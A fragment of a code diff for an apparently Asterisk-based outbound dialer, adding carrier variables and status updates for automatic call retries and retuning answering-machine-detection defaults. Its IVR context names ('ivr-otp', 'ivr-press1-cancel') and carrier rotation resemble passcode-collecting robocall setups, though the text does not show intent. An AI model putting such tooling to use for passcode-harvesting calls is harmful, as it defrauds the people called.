+          ASSIGNED_CARRIER: retryCarrier,
+          __ASSIGNED_CARRIER: retryCarrier,
+          OUTBOUND_CARRIER: retryCarrier,
+          __OUTBOUND_CARRIER: retryCarrier,
         };
+
+        const activeRetryState: CallState = {
+          ...retryState,
+          channel,
+          status: 'dialing',
+          cause: `Reintento automático #${currentAttempts} en curso`,
+          timestamp: Date.now(),
+        };
+        callStatusStore.set(number, activeRetryState);
+        callStatusStore.set(clean10, activeRetryState);
+        callStatusStore.set(formattedDest, activeRetryState);
 
         const fastResult = await amiFastOriginate(channel, targetContext, 's', originateCallerId, originateVars);
         if (!fastResult.success) {
@@ -11284,7 +11399,7 @@ async function collectAmdDiagnostic() {
     return m ? m[1].trim() : null;
   };
 
-  const dialplanContextsWithAmd = ['ivr-press1', 'ivr-otp', 'ivr-press1-cancel', 'ivr-otp-verify', 'ivr-audio-then-agent'].map((ctx) => {
+  const dialplanContextsWithAmd = ['ivr-press1', 'ivr-otp', 'ivr-press1-cancel', 'ivr-otp-verify', 'ivr-audio-then-agent', 'ivr-direct-playback'].map((ctx) => {
     const ctxIdx = extensionsContent.indexOf(`[${ctx}]`);
     if (ctxIdx < 0) return { context: ctx, present: false, hasAmd: false, hasRetry: false };
     const nextCtxMatch = extensionsContent.slice(ctxIdx + ctx.length + 2).search(/^\[[a-zA-Z0-9_-]+\]/m);
@@ -11355,13 +11470,13 @@ async function collectAmdDiagnostic() {
     appRegistered,
     amdConfExists,
     amdParams: {
-      initial_silence: parseParam('initial_silence') || '3500',
-      greeting: parseParam('greeting') || '2200',
+      initial_silence: parseParam('initial_silence') || '2500',
+      greeting: parseParam('greeting') || '1500',
       after_greeting_silence: parseParam('after_greeting_silence') || '800',
       total_analysis_time: parseParam('total_analysis_time') || '5000',
       min_word_length: parseParam('min_word_length') || '100',
       between_words_silence: parseParam('between_words_silence') || '50',
-      maximum_number_of_words: parseParam('maximum_number_of_words') || '7',
+      maximum_number_of_words: parseParam('maximum_number_of_words') || '4',
       silence_threshold: parseParam('silence_threshold') || '256',
       maximum_word_length: parseParam('maximum_word_length') || '5000',
     },
